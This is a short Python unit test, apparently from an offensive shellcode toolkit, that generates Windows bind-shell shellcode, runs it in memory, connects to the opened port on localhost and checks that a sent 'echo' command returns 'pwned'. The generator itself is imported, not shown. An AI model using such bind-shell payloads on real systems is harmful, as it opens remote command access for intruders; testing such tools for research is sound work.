import random
import socket
import time
import unittest

from coder import bind_shell
from runner import load_shellcode, run_shellcode
from stones import assemble


class TestBindShell(unittest.TestCase):
    def test_run_shellcode(self):
        port = random.randint(49152, 65535)

        code = bind_shell.generate(
            port,
            bad_chars=b"\x00",
            exit_func=("ntdll.dll", "RtlExitUserThread"),
            debug=False,
        )
        shellcode = assemble(code)

        ptr = load_shellcode(shellcode)
        run_shellcode(ptr, wait=False)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(("127.0.0.1", port))

            s.send(b"echo p^w^n^e^d\r\n")
            time.sleep(0.5)

            resp = s.recv(0x1000)
            s.send(b"exit\r\n")

        self.assertIn(b"pwned", resp)
